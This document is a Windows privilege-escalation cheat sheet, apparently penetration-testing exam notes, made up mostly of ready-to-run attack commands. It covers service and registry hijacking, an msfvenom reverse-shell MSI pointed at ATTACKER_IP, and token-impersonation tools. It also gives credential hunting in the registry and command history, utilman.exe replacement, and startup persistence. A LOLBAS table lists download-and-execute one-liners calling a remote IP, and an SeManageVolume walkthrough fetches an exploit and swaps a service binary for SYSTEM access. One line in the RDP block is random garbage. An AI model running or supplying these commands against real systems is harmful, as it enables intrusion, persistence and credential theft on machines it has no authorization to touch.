## Quick Enumeration
   
whoami /all

systeminfo

net users

net localgroup administrators

ipconfig /all

tasklist /svc


winPEAS, privilege escalation





## Kernel Exploits

Check OS version and missing patches:

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`

`wmic qfe get Caption,Description,HotFixID,InstalledOn`

Use Watson or Windows Exploit Suggester (WES)

Try: MS16-032, MS17-010 (EternalBlue), CVE-2019-1388


Windows exploit suggester OSCP





## Service Exploits
   
Insecure Permissions
`sc qc <service_name>`

`.\accesschk.exe /accepteula -uwcqv "Authenticated Users" *`

If you can modify a service:

`sc config <service_name> binpath="C:\path\to\reverse.exe"`
`net stop <service_name> && net start <service_name>`

### Unquoted Service Paths
`wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\"`

Exploit by placing binary in path:

`copy reverse.exe "C:\Program Files\Example Path\reverse.exe"`

## Weak Registry Permissions
`reg add HKLM\SYSTEM\CurrentControlSet\services\<svc> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f`
`net start <svc>`


Insecure service permissions Windows privesc site:reddit.com





## AlwaysInstallElevated
   
Check both registry keys:

`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`

If both are 0x1:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f msi -o reverse.msi`

On target:

`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`


## Token Impersonation
   
Check for:

`whoami /priv`

Look for:

```powershell
SeImpersonatePrivilege
SeAssignPrimaryTokenPrivilege
```

Exploit with:

PrintSpoofer: `PrintSpoofer.exe -c "cmd.exe"`
Juicy Potato / Rotten Potato (older systems)

Works on Windows 10 < 1809 and Server 2016


## Password Hunting
   
Saved Credentials
`cmdkey /list`
`runas /savecred /user:admin "C:\PrivEsc\reverse.exe"`

## Configuration Files
`dir /s *pass* == *.config`
`findstr /si password *.xml *.ini *.txt`

## Registry
```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

PowerShell History
`type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`


Windows password hunting privesc





7. Scheduled Tasks & Startup
   
Scheduled Tasks

`schtasks /query /fo LIST /v`

If you can write to task script:

`echo C:\PrivEsc\reverse.exe >> C:\Tasks\Cleanup.ps1`

Startup Folder

`icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`

Create shortcut:
```powershell
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```
Run: cscript CreateShortcut.vbs


Windows startup folder privilege escalation site:reddit.com


## SeRestorePrivilege

```powershell
# Rename utilman.exe and copy cmd.exe in its place
move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.bak
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

## rdp
```sql
xfreerdp3 /v:192.168.1.100 /u:username /p:password

xfreerdp3 /v:target.domain.com /u:username /d:DOMAIN /auth-pkg-list:kerberos
fucdiofjdsklfasdflsdajfldksarapemeflsdfkdsfks

```

8. LOLBAS (Windows GTFOBins)
Living Off The Land Binaries – abuse trusted Windows tools:

Binary	Command

certutil	certutil -urlcache -split -f http://IP/nc.exe nc.exe

regsvr32	regsvr32 /s /n /u /i:http://IP/rev.sct scrobj.dll
mshta	mshta http://IP/rev.hta

cscript	cscript //E:javascript \\IP\rev.js

wmic	wmic process call create "cmd /c reverse.exe"

powershell	powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://IP/rev.ps1')


## SePrivielge exploits

#### semanagevolumeprivilege
Step-by-step instructions
Confirm the user has the SeManageVolumePrivilege using:
whoami /priv

Look for SeManageVolumePrivilege in the output. 
Obtain or compile an exploit tool such as:
CsEnox/SeManageVolumeExploit
xct/SeManageVolumeAbuse
Upload the compiled exploit binary (e.g., SeManageVolumeExploit.exe) to the target system using:
certutil -urlcache -split -f "http://ATTACKER_IP/SeManageVolumeExploit.exe"

Run the exploit to trigger the FSCTL_SD_GLOBAL_CHANGE control code:
SeManageVolumeExploit.exe

This replaces the Administrators SID (S-1-5-32-544) with the Users SID (S-1-5-32-545) across the entire C: drive. 
Verify file system permissions are altered using:
icacls "C:\Program Files\SomeService\service.exe"

You should now see BUILTIN\Users:(F) (Full Control). 
Replace a privileged service binary (e.g., edgeupdate.exe) with a malicious executable:
ren "C:\Program Files\Microsoft\Edge Update\edgeupdate.exe" edgeupdate.exe.old
copy "C:\Tools\malicious.exe" "C:\Program Files\Microsoft\Edge Update\edgeupdate.exe"

Restart the service to execute the payload as SYSTEM:
sc stop "edgeupdate"
sc start "edgeupdate"

Alternatively, wait for system reboot.
Gain a SYSTEM shell via your payload (e.g., reverse shell, user creation, etc.).



